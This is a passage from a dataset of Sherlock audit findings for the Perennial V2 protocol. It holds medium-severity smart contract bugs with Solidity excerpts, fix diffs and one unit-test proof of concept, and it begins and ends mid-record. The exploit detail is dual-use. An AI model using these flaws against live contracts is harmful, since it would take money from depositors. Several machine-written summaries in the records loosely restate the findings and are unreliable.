      "summary": "\nThe bug report is about a vulnerability found in the ChainlinkFactory protocol. The protocol states that only requested versions will pay out a keeper fee, while non-requested versions will not. However, the code for the protocol does not take into account the number of requested versions and ends up paying keeper fees for both requested and non-requested versions. This can be exploited by malicious actors to drain the fees balance of ChainlinkFactory. The report recommends that the code be updated to only charge keeper fees for requested versions. The issue has been fixed by the protocol team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/32",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "31181",
      "title": "M-9: Vault checkpoints slightly incorrect conversion from assets to shares leads to slow loss of funds for long-time vault depositors",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/25 \n\n## Found by \npanprog\n## Summary\n\nWhen vault checkpoints convert assets to shares (specifically used to calculate user's shares for their deposit), it uses the following formula:\n`shares = (assets[before fee] - settlementFee) * checkpoint.shares/checkpoint.assets * (deposit + redeem - tradeFee) / (deposit + redeem)`\n\n`settlementFee` in this formula is taken into account slightly incorrectly: in actual market collateral calculations, both settlement fee and trade fee are subtracted from collateral, but this formula basically multiplies `1 - settlement fee percentage` by `1 - trade fee percentage`, which is slightly different and adds the calculation error = `settlement fee percentage * trade fee percentage`.\n\nThis is the scenario to better understand the issue:\n1. Linear fee = 2%, settlement fee = $1\n2. User1 deposits $100 into the vault (linear fee = $2, settlement fee = $1)\n3. Vault assets = $97 (due to fees), User1 shares = 100\n4. User2 deposits $100 into the vault (linear fee = $2, settlement fee = $1)\n5. Vault assets = $194, User1 shares = 100, but User2 shares = 100.02, meaning User1's share value has slightly fallen due to a later deposit.\n\nThis is the calculation for User2 shares:\n`shares = ($100 - $1) * 100/$97 * ($100 - $2) / $100 = $99 * 100/$97 * $98/$100 = $99 * 98/$97 = 100.02`\n\nThe extra 0.02 this user has received is because the `tradeFee` is taken from the amount after settlement fee ($99) rather than full amount as it should ($100). This difference (`settlementFee * tradeFee = $0.02`) is unfair amount earned by User2 and loss of funds for User1.\n\nWhen redeeming, the formula for shares -> assets vault checkpoint conversion is correct and the correct amount is redeemed. \n\nThis issue leads to all vault depositors slowly losing share value with each deposit, and since no value is gained when redeeming, continuous deposits and redeems will lead to all long-time depositors continuously losing their funds.\n\n## Vulnerability Detail\n\nThis is the formula for vault checkpoint `toSharesGlobal`:\n```solidity\nfunction toSharesGlobal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {\n    // vault is fresh, use par value\n    if (self.shares.isZero()) return assets;\n\n    // if vault is insolvent, default to par value\n    return  self.assets.lte(Fixed6Lib.ZERO) ? assets : _toShares(self, _withoutSettlementFeeGlobal(self, assets));\n}\n\nfunction _toShares(Checkpoint memory self, UFixed6 assets) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    return _withSpread(self, assets.muldiv(self.shares, selfAssets));\n}\n\nfunction _withSpread(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    UFixed6 selfAssets = UFixed6Lib.unsafeFrom(self.assets);\n    UFixed6 totalAmount = self.deposit.add(self.redemption.muldiv(selfAssets, self.shares));\n    UFixed6 totalAmountIncludingFee = UFixed6Lib.unsafeFrom(Fixed6Lib.from(totalAmount).sub(self.tradeFee));\n\n    return totalAmount.isZero() ?\n        amount :\n        amount.muldiv(totalAmountIncludingFee, totalAmount);\n}\n\nfunction _withoutSettlementFeeGlobal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n    return _withoutSettlementFee(amount, self.settlementFee);\n}\n\nfunction _withoutSettlementFee(UFixed6 amount, UFixed6 settlementFee) private pure returns (UFixed6) {\n    return amount.unsafeSub(settlementFee);\n}\n```\n\nThis code translates to a formula shown above, i.e. it first subtracts settlement fee from the assets (`withoutSettlementFeeGlobal`), then multiplies this by checkpoint's share value in `_toShares` (`*checkpoint.shares/checkpoint.assets`), and then multiplies this by trade fee adjustment in `_withSpread` (`*(deposit+redeem-tradeFee) / (deposit+redeem)`). Here is the formula again:\n`shares = (assets[before fee] - settlementFee) * checkpoint.shares/checkpoint.assets * (deposit + redeem - tradeFee) / (deposit + redeem)`\n\nAs shown above, the formula is incorrect, because it basically does the following:\n`user_assets = (deposit - settlementFee) * (deposit - tradeFee)/deposit = deposit * (1 - settlementFeePct) * (1 - tradeFeePct)`\n\nBut the actual user collateral after fees is calculated as:\n`user_assets = deposit - settlementFee - tradeFee = deposit * (1 - settlementFeePct - tradeFeePct)`\n\nIf we subtract the actual collateral from the formula used in checkpoint, we get the error:\n`error = deposit * ((1 - settlementFeePct) * (1 - tradeFeePct) - (1 - settlementFeePct - tradeFeePct))`\n`error = deposit * settlementFeePct * tradeFeePct`\n`error = settlementFee * tradeFeePct`\n\nSo this is systematic error, which inflates the shares given to users with any deposit by fixed amount of `settlementFee * tradeFeePct`\n\n## Impact\n\nAny vault deposit reduces the vault assets by `settlementFee * tradeFeePct`. While this amount is not very large (in the order of $0.1 - $0.001 per deposit transaction), this is amount lost with each deposit, and given that an active vault can easily have 1000s of transactions daily, this will be a loss of $1-$100/day, which is significant enough to make it a valid issue.\n\n## Code Snippet\n\nSettlementFee subtracted from asset before proceeding in `toSharesGlobal`:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L91-L97\n\nThe result is multiplied by the checkpoint's share to assets ratio in `_toShares`:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L153-L156\n\nAnd the final result is multiplied by `tradeFee`-adjusted deposits and redeems in `_withSpread`:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/types/Checkpoint.sol#L169-L177\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRe-work the assets to shares conversion in vault checkpoint to use the correct formula:\n`shares = (assets[before fee] - settlementFee - tradeFee * assets / (deposit + redeem)) * checkpoint.shares/checkpoint.assets`\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  this seem valid medium; medium(3)\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/304",
      "summary": "\nThe issue M-9 reported on GitHub by panprog is about a bug in the vault checkpoint conversion process for a specific protocol. The bug is caused by an incorrect formula used to calculate the user's shares for their deposit, which leads to a slow loss of funds for long-time vault depositors. This is due to a slight error in the calculation of the settlement fee, which results in a difference of $0.1-$0.001 per deposit transaction. This may not seem significant, but with thousands of transactions daily, it can lead to a loss of $1-$100 per day. The bug was found through a manual review and the protocol team has fixed it in their code. The recommendation is to rework the assets to shares conversion in the vault checkpoint to use the correct formula. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/25",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31180",
      "title": "M-8: Vault and oracle keepers DoS in some situations due to `market.update(account,max,max,max,0,false)`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/23 \n\n## Found by \npanprog\n## Summary\n\nWhen user's market account is updated without position and collateral change (by calling `market.update(account,max,max,max,0,false)`), this serves as some kind of \"settling\" the account (which was the only way to settle the account before v2.3). However, this action still reverts if the account is below margin requirement.\n\nThe issue is that some parts of the code use this action to \"settle\" the account in the assumption that it never reverts which is not true. This causes unpexpected reverts and denial of service to users who can not execute transactions in some situations, in particular:\n\n1. Oracle `KeeperFactory.settle` uses this method to settle all accounts in the market for the oracle verison and will revert entire market version's settlement if any account which is being settled is below margin requirement. Example scenario:\n1.1. User increases position to the edge of margin requirement\n1.2. The price rises slightly for the commited oracle version, and user position is settled and is now slightly below margin requirements\n1.3. All attempts to settle accounts for the commited oracle version for this market will revert as user's account collateral is below margin requirements.\n\n2. Vault `Vault._updateUnderlying` uses this method to settle all vault's accounts in the markets. This function is called at the start of `rebalance` and `update`, with `rebalance` also being called before any admin vault parameters changes such as updating market leverages, weights or cap. This becomes especially problematic if any market is \"removed\" from the vault by setting its weight to 0, but the market still has some position due to `minPosition` limitation (as described in another issue). In such case each vault update will bring this market's position to exact edge of margin requirement, meaning a lot of times minimal price changes will put the vault's market account below margin requirement, and as such most Vault functions will revert (`update`, `rebalance` and admin param changes). Moreover, since the vault rebalances collateral and/or position size only in `_manage` (which is called only from `update` and `rebalance`), this means that the vault is basically bricked until this position is either liquidated or goes above margin requirement again due to price changes.\n\n## Vulnerability Detail\n\nWhen `Market.update` is called, any parameters except `protected = true` will perform the following check from the `InvariantLib.validate`:\n```solidity\nif (\n    !PositionLib.margined(\n        context.latestPosition.local.magnitude().add(context.pending.local.pos()),\n        context.latestOracleVersion,\n        context.riskParameter,\n        context.local.collateral\n    )\n) revert IMarket.MarketInsufficientMarginError();\n```\n\nThis means that even updates which do not change anything (empty order and 0 collateral change) still perform this check and revert if the user's collateral is below margin requirement.\n\nSuch method to settle accounts is used in `KeeperOracle._settle`:\n```solidity\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n\nThis is called from `KeeperFactory.settle`, which the keepers are supposed to call to settle market accounts after the oracle version is commited. This will revert, thus keepers will temporarily be unable to call this function for the specific oracle version until all users are at or above margin.\n\nThe same method is used to settle accounts in `Vault._updateUnderlying`:\n```solidity\nfunction _updateUnderlying() private {\n    for (uint256 marketId; marketId < totalMarkets; marketId++)\n        _registrations[marketId].read().market.update(\n            address(this),\n            UFixed6Lib.MAX,\n            UFixed6Lib.ZERO,\n            UFixed6Lib.ZERO,\n            Fixed6Lib.ZERO,\n            false\n        );\n}\n```\n\n## Impact\n\n1. Keepers are unable to settle market accounts for the commited oracle version until all accounts are above margin. The oracle fees are still taken from all accounts, but the keepers are blocked from receiving it.\n2. If any Vault's market weight is set to 0 (or if vault's position in any market goes below margin for whatever other reason), most of the time the vault will temporarily be bricked until vault's position in that market is liquidated. The only function working in this state is `Vault.settle`, even all admin functions will revert.\n\n## Code Snippet\n\n`InvariantLib.validate` reverts for all updates (except liquidations) where account is below margin requirements:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/libs/InvariantLib.sol#L78-L85\n\n`KeeperOracle._settle` uses `Market.update` to settle accounts:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L178-L180\n\n`Vault._updateUnderlying` also uses the same method to settle accounts:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/Vault.sol#L342-L352\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nDepending on intended functionality:\n1. Ignore the margin requirement for empty orders and collateral change which is >= 0.\n**AND/OR**\n2. Use `Market.settle` instead of `Market.update` to settle accounts, specifically in `KeeperOracle._settle` and in `Vault._updateUnderlying`. There doesn't seem to be any reason or issue to use `settle` instead of `update`, it seems that `update` is there just because there was no `settle` function available before.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/309",
      "summary": "\nThis bug report discusses an issue with the code related to updating user accounts in a market. When the account is updated without any changes to the position or collateral, it causes an unexpected revert which leads to denial of service for users in certain situations. This can happen when the market is settled by the oracle or when the vault is updated. This issue was found by user panprog and can cause problems for keepers who are unable to settle accounts until all users are above margin requirements. Additionally, if a market's weight is set to 0, the vault will be unable to function until the position is liquidated. This issue was found through manual review and the recommendation is to either ignore the margin requirement for empty orders and collateral changes greater than or equal to 0, or to use a different method to settle accounts. The protocol team has already addressed this issue in a recent PR.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/23",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "31179",
      "title": "M-7: Liquidator can set up referrals for other users",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/22 \n\n## Found by \nbin2chen\n## Summary\nIf a user has met the liquidation criteria and currently has no referrer\nthen a malicious liquidator can specify a referrer in the liquidation order.\nmaking it impossible for subsequent users to set up the referrer they want.\n\n## Vulnerability Detail\nCurrently, there are 2 conditions to set up a referrer\n1. the order cannot be empty   （Non-empty orders require authorization unless they are liquidation orders）\n2. there can't be another referrer already  \n\n```solidity\n    function _loadUpdateContext(\n        Context memory context,\n        address account,\n        address referrer\n    ) private view returns (UpdateContext memory updateContext) {\n...\n        updateContext.referrer = referrers[account][context.local.currentId];\n        updateContext.referralFee = IMarketFactory(address(factory())).referralFee(referrer);\n    }\n\n    function _processReferrer(\n        UpdateContext memory updateContext,\n        Order memory newOrder,\n        address referrer\n    ) private pure {\n@>      if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n        if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n        if (updateContext.referrer == referrer) return;\n\n        revert MarketInvalidReferrerError();\n    }\n\n\n    function _storeUpdateContext(Context memory context, UpdateContext memory updateContext, address account) private {\n...\n        referrers[account][context.local.currentId] = updateContext.referrer;\n    }\n```\nHowever, if the user does not have a referrer, the liquidation order is able to meet both of these restrictions\n\nThis allows the liquidator to set up referrals for other users.\n\nWhen the user subsequently tries to set up a referrer, it will fail.\n\n## Impact\n\nIf a user is set up as a referrer by a liquidated order in advance, the user cannot be set up as anyone else.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L503\n## Tool used\n\nManual Review\n\n## Recommendation\nRestrictions on Liquidation Orders Cannot Set a referrer\n```diff\n    function _processReferrer(\n        UpdateContext memory updateContext,\n        Order memory newOrder,\n        address referrer\n    ) private pure {\n+       if (newOrder.protected() && referrer != address(0)) revert MarketInvalidReferrerError;\n        if (newOrder.makerReferral.isZero() && newOrder.takerReferral.isZero()) return;\n        if (updateContext.referrer == address(0)) updateContext.referrer = referrer;\n        if (updateContext.referrer == referrer) return;\n\n        revert MarketInvalidReferrerError();\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> invalid, because this is the system design: referral can receive some fee from the user, and when liquidator liquidates - his (liquidator's) referral will get some fee from the user. Moreover, the referral is set for each order, and since no order can be placed until liquidation settles, the user can't execute orders for the same oracle version anyway, and for the following oracle versions a new referrer can easily be set\n\n\n\n**nevillehuang**\n\n@bin2chen66 This seems invalid based on @panprog comment.\n\n**bin2chen66**\n\nThe system design doesn't seem to be like this. Could it be that I misunderstood?\nThe referrer is set and cannot be modified.\n1. _loadUpdateContext () take the previous referrer\n2. context.local.currentId unchanged or + 1\n3. _processReferrer () Verify that updateContext.referrer must be equal to the referrer of the current order\n4. _storeUpdateContext () save referrers [account] [context.local.currentId]\n\n\nThe referrer inherits the previous one and verifies that it cannot be reset.\n@Panprog Can you see where can reset it, Did I miss it? Thanks.\n\n\n**panprog**\n\n@bin2chen66 @nevillehuang \nYes, I agree with @bin2chen66 , the referrer can not be modified. Sorry for incorrect comment, I've missed that it's not reset between updates. I believe this is medium then as it allows to set the referral for the user during liquidation which he can't change.\n\n**arjun-io**\n\nIt's accurate that the liquidator can set a referral address as part of the liquidation - this is acceptable. The referrer address is locked for the current ID but future orders (for a different local.currentId) should not have the referrer set - if they do that would be a bug. So as long as the liquidation version is filled, new orders for the next version should be fine. \n\n**nevillehuang**\n\n@arjun-io So do you agree this is a valid issue? I am incline to keep medium given referrer setting can be blocked\n\n**arjun-io**\n\nNo I don't think it is, the only way this would be valid is if setting referrer is blocked for _future_ orders that are not from the same Oracle Version. Would defer to auditors to double check this\n\n**panprog**\n\n@nevillehuang @arjun-io \nYes, after the referrer is set once, user can never change it again, because it's loaded from currentId into updateContext, but then if `local.currentId` increases, the same referrer (from previous currentId) is stored into new currentId, thus referrer is always carried over from previous ids.\nSo it seems that the issue which is valid is that it's impossible to change referrer once set, not that liquidator can set his referrer, although it wasn't really obvious from the docs (the intended functionality of setting the referrer).\n\n**arjun-io**\n\nAh I see, the issue arises from the _storeUpdateContext using an updated context.local.currentId - this would also be an issue for liquidations then, I believe. In which case this is a deeper issue which might be a High\n\n**panprog**\n\n@arjun-io\nDo you mean that liquidator carries over from previous ids to currentId? Yes, it carries over like referrer, however, the accumulated `liquidationFee` will be 0 for all orders which are not protected (`CheckPointLib._accumulateLiquidationFee`):\n```solidity\n    function _accumulateLiquidationFee(\n        Order memory order,\n        Version memory toVersion\n    ) private pure returns (UFixed6 liquidationFee) {\n        if (order.protected())\n            return toVersion.liquidationFee.accumulated(Accumulator6(Fixed6Lib.ZERO), UFixed6Lib.ONE).abs();\n    }\n```\n\nSo there is no issue with liquidators. Even though the liquidators map will be set for all currentIds, this liquidator will be credited only once during the liquidation, and in following liquidations it will be overwritten with new liquidator. Yes, it's better to fix it so that liquidator doesn't carry over from previoud ids, but there is no impact in this right now.\n\nAnd the impact for the issue described here I think is medium, not high.\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/297",
      "summary": "\nIssue M-7: Liquidator can set up referrals for other users\n\nSummary:\nA bug has been found by user bin2chen where a malicious liquidator can set up referrals for other users, making it impossible for subsequent users to set up the referrer they want. This is due to the current restrictions on setting up a referrer, which can easily be bypassed if the user does not have a referrer. This allows the liquidator to set up referrals for other users, preventing them from setting up their own referrer in the future.\n\nImpact:\nIf a user is set up as a referrer by a liquidated order in advance, they cannot be set up as anyone else.\n\nCode Snippet:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L503\n\nRecommendation:\nRestrictions on liquidation orders should be implemented to prevent setting up a referrer.\n\nDiscussion:\nThere was some confusion on whether this issue is valid or not, but it has been confirmed that the liquidator can indeed set up a referral address as part of the liquidation. However, the issue arises when the referrer is locked for the current ID and cannot be changed for future orders. This is a deeper issue that could potentially be classified as High severity.\n\nResolution:\nThe protocol team has fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/297.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/22",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "31178",
      "title": "M-6: _loadContext() uses the wrong pendingGlobal.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/17 \n\n## Found by \nbin2chen\n## Summary\n`StrategyLib._loadContext()` is using the incorrect `pendingGlobal`, causing `currentPosition`, `minPosition`, and `maxPosition` to be incorrect, leading to incorrect rebalance operation.\n\n## Vulnerability Detail\nIn `StrategyLib._loadContext()`, there is a need to compute `currentPosition`, `minPosition`, and `maxPosition`. \nThe code  as follows:\n```solidity\n    function _loadContext(\n        Registration memory registration\n    ) private view returns (MarketStrategyContext memory marketContext) {\n...\n        // current position\n@>      Order memory pendingGlobal = registration.market.pendings(address(this));\n        marketContext.currentPosition = registration.market.position();\n        marketContext.currentPosition.update(pendingGlobal);\n        marketContext.minPosition = marketContext.currentAccountPosition.maker\n            .unsafeSub(marketContext.currentPosition.maker\n                .unsafeSub(marketContext.currentPosition.skew().abs()).min(marketContext.closable));\n        marketContext.maxPosition = marketContext.currentAccountPosition.maker\n            .add(marketContext.riskParameter.makerLimit.unsafeSub(marketContext.currentPosition.maker));\n    }\n```\n\nThe code above `pendingGlobal = registration.market.pendings(address(this));` is wrong\nIt takes the address(this)'s `pendingLocal`.\nThe correct approach is to use `pendingGlobal = registration.market.pending();`.\n\n## Impact\nSince `pendingGlobal` is wrong, `currentPosition`, `minPosition` and `maxPosition` are all wrong.\naffects subsequent rebalance calculations, such as `target.position` etc.\nrebalance does not work properly\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial-vault/contracts/lib/StrategyLib.sol#L200\n## Tool used\n\nManual Review\n\n## Recommendation\n```diff\n    function _loadContext(\n        Registration memory registration\n    ) private view returns (MarketStrategyContext memory marketContext) {\n...\n        // current position\n-       Order memory pendingGlobal = registration.market.pendings(address(this));\n+       Order memory pendingGlobal = registration.market.pending();\n        marketContext.currentPosition = registration.market.position();\n        marketContext.currentPosition.update(pendingGlobal);\n        marketContext.minPosition = marketContext.currentAccountPosition.maker\n            .unsafeSub(marketContext.currentPosition.maker\n                .unsafeSub(marketContext.currentPosition.skew().abs()).min(marketContext.closable));\n        marketContext.maxPosition = marketContext.currentAccountPosition.maker\n            .add(marketContext.riskParameter.makerLimit.unsafeSub(marketContext.currentPosition.maker));\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> valid medium, it influences the rebalance process only in very rare edge cases\n\n**takarez** commented:\n>  the reason for it should have been said.\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/299",
      "summary": "\nThe bug report is about a coding mistake in the `StrategyLib._loadContext()` function, which is causing incorrect values for `currentPosition`, `minPosition`, and `maxPosition`. This is due to the function using the wrong `pendingGlobal` variable, which affects the subsequent rebalance calculations. The impact of this bug is that the rebalance process does not work properly. The bug was found by a user named `bin2chen` and was identified through manual review. The recommendation is to fix the code by using the correct variable `pendingGlobal = registration.market.pending()`. The bug has been fixed by the protocol team in a recent PR.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/17",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "31177",
      "title": "M-5: If referral or liquidator is the same address as the account, then liquidation/referral fees will be lost due to local storage being overwritten after the `claimable` amount is credited to liquidator or referral",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/16 \n\n## Found by \nbin2chen, panprog\n## Summary\n\nAny user (address) can be liquidator and/or referral, including account's own address (the user can self-liquidate or self-refer). During the market settlement, liquidator and referral fees are credited to liquidator/referral's `local.claimable` storage. The issue is that the account's local storage is held in the memory during the settlement process, and is saved into storage after settlement/update. This means that `local.claimable` storage changes for the account are not reflected in the in-memory cached copy and discarded when the cached copy is saved after settlement.\n\nThis leads to liquidator and referral fees being lost when these are the account's own address.\n\n## Vulnerability Detail\n\nDuring market account settlement process, in the `_processOrderLocal`, liquidator and referral fees are credited to corresponding accounts via:\n```solidity\n...\n    _credit(liquidators[account][newOrderId], accumulationResult.liquidationFee);\n    _credit(referrers[account][newOrderId], accumulationResult.subtractiveFee);\n...\nfunction _credit(address account, UFixed6 amount) private {\n    if (amount.isZero()) return;\n\n    Local memory newLocal = _locals[account].read();\n    newLocal.credit(amount);\n    _locals[account].store(newLocal);\n}\n```\n\nHowever, for the account the cached copy of `_locals[account]` is stored after the settlement in `_storeContext`:\n```solidity\nfunction _storeContext(Context memory context, address account) private {\n    // state\n    _global.store(context.global);\n    _locals[account].store(context.local);\n...\n```\n\nThe order of these actions is:\n```solidity\nfunction settle(address account) external nonReentrant whenNotPaused {\n    Context memory context = _loadContext(account);\n\n    _settle(context, account);\n\n    _storeContext(context, account);\n}\n```\n\n1. Load `_locals[account]` into memory (`context.local`)\n2. Settle: during settlement `_locals[account].claimable` is increased for liquidator and referral. Note: this is not reflected in `context.local`\n3. Store cached context: `_locals[account]` is overwritten with the `context.local`, losing `claimable` increased during settlement.\n\n## Impact\n\nIf user self-liquidates or self-refers, the liquidation and referral fees are lost by the user (and are stuck in the contract, because they're still subtracted from the user's collateral).\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```ts\nit('self-liquidation fees lost', async () => {\nconst POSITION = parse6decimal('100.000')\nconst COLLATERAL = parse6decimal('120')\n\nfunction setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n}\n\ndsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true)\ndsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true)\n\nvar time = TIMESTAMP;\n\nsetupOracle('1', time, time + 100);\nawait market.connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n\ntime += 100;\nsetupOracle('1', time, time + 100);\nawait market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\ntime += 100;\nsetupOracle('1', time, time + 100);\n\ntime += 100;\nsetupOracle('0.7', time, time + 100);\n\n// self-liquidate\nsetupOracle('0.7', time, time + 100);\nawait market.connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, true);\n\n// settle liquidation\ntime += 100;\nsetupOracle('0.7', time, time + 100);\nawait market.settle(userB.address);\nvar info = await market.locals(userB.address);\nconsole.log(\"Claimable userB: \" + info.claimable);\n```\n\nConsole log:\n```solidity\nClaimable userB: 0\n```\n\n## Code Snippet\n\n`Market._credit` modifies `local.claimable` storage for the account:\nhttps://github.com/sherlock-audit/2024-02-perennial-v2-3/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L678-L684\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nModify `Market._credit` function to increase `context.local.claimable` if account to be credited matches account which is being updated.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  this seems valid valid medium; medium(2)\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/equilibria-xyz/perennial-v2/pull/302",
      "summary": "\nThis bug report discusses an issue found in the Perennial V2 protocol, specifically in the market settlement process. The issue occurs when a user (address) acts as both a liquidator and a referral, including the user's own address. During the settlement process, the liquidator and referral fees are credited to the corresponding accounts, but due to a flaw in the code, these fees are lost when the user's address is the same as the account being settled. This is because the account's local storage is held in memory during the settlement process, but is not reflected in the cached copy that is saved after settlement. As a result, the liquidator and referral fees are lost and remain stuck in the contract. The impact of this issue is that if a user self-liquidates or self-refers, they will lose these fees. The bug was discovered by bin2chen and panprog and verified by the Sherlock Audit team. A proof of concept was provided in the form of a code snippet, and the issue was fixed by the protocol team in a recent PR. The recommendation is to modify the code to ensure that the context local storage is updated correctly. This bug was manually reviewed and rated as a medium severity issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/16",
      "tags": [],
      "finders": [
        "panprog",
        "bin2chen"
      ]
    },
    {
      "id": "31176",
      "title": "M-4: All transactions to claim assets from the vault will revert in some situations due to double subtraction of the claimed assets in market position allocations calculation.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-02-perennial-v2-3-judging/issues/11 \n\n## Found by \npanprog\n## Summary\n\nWhen assets are claimed from the vault (`Vault.update(0,0,x)` called), the vault rebalances its collateral. There is an issue with market positions allocation calculations: the assets (\"total position\") subtract claimed amount twice. This leads to revert in case this incorrect `assets` amount is less than `minAssets` (caused by market's `minPosition`). In situations when the vault can't redeem due to some market's position being at the `minPosition` (because of the market's skew, which disallows makers to reduce their positions), this will lead to all users being unable to claim any assets which were already redeemed and settled.\n\n## Vulnerability Detail\n\n`Vault.update` rebalances collateral by calling `_manage`:\n```solidity\n_manage(context, depositAssets, claimAmount, !depositAssets.isZero() || !redeemShares.isZero());\n```\n\nIn the rebalance calculations, collateral and assets (assets here stands for \"total vault position\") are calculated as following:\n```solidity\n  UFixed6 collateral = UFixed6Lib.unsafeFrom(strategy.totalCollateral).add(deposit).unsafeSub(withdrawal);\n  UFixed6 assets = collateral.unsafeSub(ineligable);\n\n  if (collateral.lt(strategy.totalMargin)) revert StrategyLibInsufficientCollateralError();\n  if (assets.lt(strategy.minAssets)) revert StrategyLibInsufficientAssetsError();\n```\n\n`ineligable` is calculated as following:\n```solidity\nfunction _ineligable(Context memory context, UFixed6 withdrawal) private pure returns (UFixed6) {\n    // assets eligable for redemption\n    UFixed6 redemptionEligable = UFixed6Lib.unsafeFrom(context.totalCollateral)\n        